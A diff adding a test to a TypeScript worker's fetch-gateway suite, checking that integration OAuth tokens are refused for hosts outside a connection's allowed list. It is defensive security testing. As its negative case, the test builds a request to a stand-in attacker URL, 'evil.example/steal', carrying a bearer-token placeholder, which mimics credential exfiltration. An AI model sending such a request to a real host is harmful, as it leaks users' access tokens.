@@ -16,6 +16,7 @@ import { createInMemoryUserMeterEnv } from '#worker/test-support/user-meter.ts'
 import * as packageRepo from '#worker/package-registry/repo.ts'
 import * as integrationCredentials from '#worker/integrations/credentials.ts'
 import * as integrationPackageAccess from '#worker/integrations/package-access.ts'
+import * as integrationService from '#worker/integrations/service.ts'
 
 const userMeter = createInMemoryUserMeterEnv()
 const env = {
@@ -475,6 +476,51 @@ test('fetch gateway gates integration-owned token names by the connection grant,
 		resolveSpy.mockRestore()
 		tokenSpy.mockRestore()
 		grantSpy.mockRestore()
+	}
+})
+
+test('fetch gateway refuses integration tokens for a host outside requiredHosts', async () => {
+	const grantSpy = vi
+		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
+		.mockResolvedValue(undefined)
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue({
+			lane: 'user',
+			app: {
+				apiBaseUrl: 'https://www.googleapis.com',
+			},
+			connection: {
+				requiredHosts: ['www.googleapis.com', 'oauth2.googleapis.com'],
+			},
+		} as never)
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: new Request('https://evil.example/steal', {
+					headers: {
+						Authorization: 'Bearer {{integration-token:google}}',
+					},
+				}),
+				props,
+				env,
+			}),
+		).rejects.toThrow('does not allow requests to host "evil.example"')
+		expect(tokenSpy).toHaveBeenCalled()
+		expect(joinedSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+	} finally {
+		grantSpy.mockRestore()
+		tokenSpy.mockRestore()
+		joinedSpy.mockRestore()
 	}
 })
 
